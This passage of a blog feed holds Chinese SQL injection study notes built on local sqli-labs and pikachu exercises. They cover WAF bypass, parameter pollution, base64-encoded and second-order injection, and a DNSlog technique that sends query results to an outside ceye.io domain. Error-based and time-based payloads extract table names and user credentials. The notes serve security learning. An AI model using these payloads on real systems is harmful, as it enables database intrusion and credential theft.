src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107512.png" alt="image-20210831202740911"></p><p>我们测试发现成功绕过</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107413.png" alt="image-20210831202834958" style="zoom:50%;" /><p><strong>通过注释符绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/和/***/都是注释符，都可以用来注释。他们的效果是一样的。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107725.png" alt="image-20210831211201461"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107542.png" alt="image-20210831204008554"></p><p>通过加入注释符，不影响sql语句，达到绕过的目的。</p><p>  <img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107327.png" alt="image-20210831204204715"></p><p><strong>http参数污染</strong></p><p>在与服务器进行交互的过程中，客户端往往会在GET/POST请求中带上参数。通常在一个请求中，同名参数只会出现一次，但是在HTTP协议中是允许同名参数多次出现的。</p><p> 以上图服务器为例假设请求为index.php?id=1&amp;id=2，客户端请求首先通过tomcat解析第一个参数，接下来tomcat去请求apache服务器，而apache解析最后一个参数。实际提供服务的是apache服务器，因此返回客户端的是id=2。</p><table><thead><tr><th>Web服务器</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP/Apache</td><td>$_GET(“par”)</td><td>Last</td></tr><tr><td>JSP/Tomcat</td><td>Request.getParameter(“par”)</td><td>First</td></tr><tr><td>Perl(CGI)/Apache</td><td>Param(“par”)</td><td>First</td></tr><tr><td>Python/Apache</td><td>Getvalue(“par”)</td><td>All(List)</td></tr><tr><td>ASP/IIS</td><td>Request.QueryString(“par”)</td><td>All(comma-delimited string)</td></tr></tbody></table><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211107944.png" alt="image-20210831210602805"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211108991.png" alt="image-20210831210553919" style="zoom:50%;" /><p>可以看到apache最后接收到了3。</p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/backlion/p/9721687.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/nzjdsds/article/details/93740686</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>17WEB漏洞--SQL注入之二次、加解密、DNS等注入</title>
      <link href="/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/09/21/17WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E4%BA%8C%E6%AC%A1%E3%80%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E3%80%81DNS%E7%AD%89%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>将参数通过base64或者其他方式进行加密，然后进行传输，在通过后端进行解密。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-21/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D;</span><br></pre></td></tr></table></figure><p>cookie存在加密<code>YWRtaW4%3D</code>，base64转换为admin，所有我们只需要将我们的注入通过base64加密传输过去就ok了。</p><p>第一个返回正确，第二个返回错误存在注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and 1=1 #</span><br><span class="line">编码后:</span><br><span class="line">YWRtaW4nKSBhbmQgMT0xICM=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and 1=2 #</span><br><span class="line">编码后:</span><br><span class="line">YWRtaW4nKSBhbmQgMT0yICM=</span><br></pre></td></tr></table></figure><p>这里试下报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) and extractvalue(1,concat(0x7e,database(),0x7e)) #</span><br><span class="line">JykgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSkpICM=</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106887.png" alt="image-20210829190951933"></p><p>通过sqlmap中转注入，将payload编码为base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url=&#x27;http://xxxx/job_bystjb/yjs_byszjs.asp?id=&#x27;;</span><br><span class="line">$payload=base64_encode($_GET[&#x27;x&#x27;]);</span><br><span class="line">echo $payload;</span><br><span class="line">$urls=$url.$payload;</span><br><span class="line">file_get_contents($urls);</span><br><span class="line">echo $urls;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106892.png" alt="image-20210829191514117"></p><p>​        二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。详细点来讲，就是在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。二次注入无法通过扫描工具或者代码自己手工测试出来的，二次注入一般会产生在网站程序源代码才会发现的注入漏洞，从前端或者黑盒测试是看不到这个漏洞的。</p><h4 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h4><p>二次注入一般产生在有登录注册页面这里</p><h4 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h4><p>有时候网页会通过限制输入长度来限制我们，如果是前端限制的话，我们可以将限制修改掉，如果是后端，那没办法了。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-24/</span><br></pre></td></tr></table></figure><p>我们首先创建一个admin’#的用户</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106908.png" alt="image-20210829193029046"></p><p>然后我们登录</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106031.png" alt="image-20210829193111881" style="zoom:67%;" /><p>将密码修改为admin此时数据库中admin的密码为1234</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106486.png" alt="image-20210829193204312"></p><p>可以看到admin的密码被我们修改为admin，这样就形成了二次注入，我们试试报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) #</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106238.png" alt="image-20210829193354479"></p><p>没成功，数据库限制了长度，试试密码能注入不，也不能。</p><p>原理就是这样。</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p><h4 id="UNC"><a href="#UNC" class="headerlink" title="UNC"></a>UNC</h4><p>UNC（Universal Naming Convention）：通用命名规则，也称通用命名规范、通用命名约定。UNC为网络（主要指局域网）上资源的完整Windows名称。UNC路径格式：\servername\sharename，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\servername\sharename\directory\filename。由于反斜杠的转义效果，语句中输入的四个反斜杠 （\\），在转义后得到（\）。实际执行的只有两个反引号。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>concat函数将执行结果与获取到的域名（XXX.ceye.io\abc）拼接，构成一个新的域名， load_file()可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析，然后我们查看DNS解析记录就可以得到sql查询结果</p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows： load_file()</span><br><span class="line">查看mysql读取权限。</span><br><span class="line">show variables like &#x27;%secure%&#x27;;</span><br><span class="line">secure_file_priv项为空才可以使用load_fil()函数，在mysql.ini中添加 secure_file_priv=&#x27;&#x27; </span><br></pre></td></tr></table></figure><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNSlog注入。</p><h4 id="推荐平台"><a href="#推荐平台" class="headerlink" title="推荐平台"></a>推荐平台</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/（需要注册）  </span><br><span class="line">http://www.dnslog.cn</span><br><span class="line">http://admin.dnslog.link</span><br></pre></td></tr></table></figure><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/?id=-1&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.nd91wz.ceye.io\\abc&#x27;))),1,0)--+ </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106508.png" alt="image-20210901142715138"></p><p><code>&quot;\\\\&quot;</code> 四个<code>\</code>不能少</p><p>注意<code>.xxxx.ceye.io</code>是你的子域名，前面要加个<code>.</code></p><p>后面的<code>\\xxx</code>，<code>\\</code>是必须的，`xxx这部分随便是什么内容，不能为空。 </p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>也可以使用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/adooo/dnslogsqlinj</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16WEB漏洞--SQL注入之查询方式及报错盲注</title>
      <link href="/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/"/>
      <url>/2021/09/21/16WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F%E5%8F%8A%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>当进行 SQL 注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是 SQL 语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL 语句大概写法也能更好的选择对应的注入语句。</p><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>在网站应用中进行数据显示查询效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 列名称 或 * from 表名称 where 字段1=&#x27;条件1&#x27; and 字段2=&#x27;条件2&#x27;</span><br></pre></td></tr></table></figure><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>在网站应用中进行用户注册添加等操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table name(列1,列2 ...) values(值1,值2)</span><br></pre></td></tr></table></figure><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>会员或后台中心数据同步或缓存等操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名称 set 列名称=新值 where 列名称=某值</span><br></pre></td></tr></table></figure><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>后台管理里面删除文章删除用户等操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名称 where 列名称=值</span><br></pre></td></tr></table></figure><h4 id="order-by-排序数据"><a href="#order-by-排序数据" class="headerlink" title="order by 排序数据"></a>order by 排序数据</h4><p>一般结合表名或列名进行数据排序操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 列名称 或 * from 表名称 order by 列名</span><br></pre></td></tr></table></figure><h4 id="重点理解："><a href="#重点理解：" class="headerlink" title="重点理解："></a>重点理解：</h4><p>我们可以通过以上查询方式与网站应用的关系</p><p>注入点产生地方或应用猜测到对方的 SQL 查询方式</p><h3 id="SQL-注入报错盲注"><a href="#SQL-注入报错盲注" class="headerlink" title="SQL 注入报错盲注"></a>SQL 注入报错盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p><p>基于布尔的 SQL 盲注-逻辑判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp,like,ascii,left,ord,mid</span><br></pre></td></tr></table></figure><p>基于时间的 SQL 盲注-延时判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if,sleep</span><br></pre></td></tr></table></figure><p>基于报错的 SQL 盲注-报错回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">floor，updatexml，extractvalue</span><br></pre></td></tr></table></figure><h3 id="基于报错的-SQL-盲注-报错回显"><a href="#基于报错的-SQL-盲注-报错回显" class="headerlink" title="基于报错的 SQL 盲注-报错回显"></a>基于报错的 SQL 盲注-报错回显</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用报错注入函数:floor，updatexml，extractvalue</span><br></pre></td></tr></table></figure><h4 id="floor报错注入（64显示位限制）"><a href="#floor报错注入（64显示位限制）" class="headerlink" title="floor报错注入（64显示位限制）"></a>floor报错注入（64显示位限制）</h4><p><strong>原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/zpy1998zpy/article/details/80650540</span><br><span class="line">https://www.freebuf.com/column/235496.html</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>小迪讲的那个有点麻烦，我简化了一下</p><p>查数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105995.png" alt="image-20210828161850724"></p><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105180.png" alt="image-20210828163633404"></p><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,column_name,0x7e) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105683.png" alt="image-20210828163806607"></p><p>查数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=2&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,concat(username,0x7e,password),0x7e) from pikachu.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;password=2&amp;sex=3&amp;phonenum=2&amp;email=2&amp;add=2&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105450.png" alt="image-20210828164159225"></p><h4 id="updatexml报错注入（32显示位限制）"><a href="#updatexml报错注入（32显示位限制）" class="headerlink" title="updatexml报错注入（32显示位限制）"></a>updatexml报错注入（32显示位限制）</h4><p><strong>原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881140/article/details/89565706</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>查数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p>查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 3,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106721.png" alt="image-20210828165528886"></p><p>查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211106317.png" alt="image-20210828165928071"></p><p>查数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=3&#x27;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from pikachu.users limit 0,1),0x7e),1) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105013.png" alt="image-20210828170043295"></p><h4 id="extractvalue报错注入（32显示位限制）"><a href="#extractvalue报错注入（32显示位限制）" class="headerlink" title="extractvalue报错注入（32显示位限制）"></a>extractvalue报错注入（32显示位限制）</h4><p><strong>原理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881140/article/details/89565706</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>查数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1 &#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;password=3&amp;sex=3&amp;phonenum=3&amp;email=3&amp;add=3&amp;submit=submit</span><br></pre></td></tr></table></figure><p>后面的和updatexml差不多，需要注意的是extractvalue只有俩个参数</p><h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><p>刚才上面是通过insert进行的注入，这里试一下update，原理一样这里就查一下数据库名，其他的看上面。</p><h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sex=a&#x27; and extractvalue(1,concat(0x7e,database(),0x7e)) and &#x27;&amp;phonenum=a&amp;add=a&amp;email=a&amp;submit=submit</span><br></pre></td></tr></table></figure><h4 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h4><p>GET方式的话，如果是在burp suite中去进行注入，需要将空格改为加号或者%20。POST则不需要</p><h5 id="floor-1"><a href="#floor-1" class="headerlink" title="floor"></a>floor</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and (select 1 from (select count(*) ,concat((select concat(0x7e,database(),0x7e) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><h5 id="updatexml-1"><a href="#updatexml-1" class="headerlink" title="updatexml"></a>updatexml</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h5 id="extractvalue-1"><a href="#extractvalue-1" class="headerlink" title="extractvalue"></a>extractvalue</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=56 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><h3 id="基于时间的-SQL-盲注-延时判断"><a href="#基于时间的-SQL-盲注-延时判断" class="headerlink" title="基于时间的 SQL 盲注-延时判断"></a>基于时间的 SQL 盲注-延时判断</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">like &#x27;ro%&#x27;                      #判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^xiaodi[1-z]&#x27;    #匹配xiaodi及xiaodi...等</span><br><span class="line">if(条件,5,0)                   #条件成立，返回5，反之，返回0</span><br><span class="line">sleep(5)                       #SQL语句延时执行5秒</span><br><span class="line">mid(a,b,c)                    #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)                #从B位置开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database()    #left(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())=8   #判断数据库database()名的长度</span><br><span class="line">ascii() 字符串转换ascii码</span><br><span class="line">ord     ascii码转换为数字</span><br><span class="line">ord=ascii ascii(x)=97   #判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure><p>页面错误和正确返回一样。一般都用脚本跑</p><h4 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：if(ascii(substr(database(),1,1))=114,sleep(5),1)</span><br></pre></td></tr></table></figure><p>查看表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit    0,1),1,1))=101,sleep(3),0)--+</span><br></pre></td></tr></table></figure><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 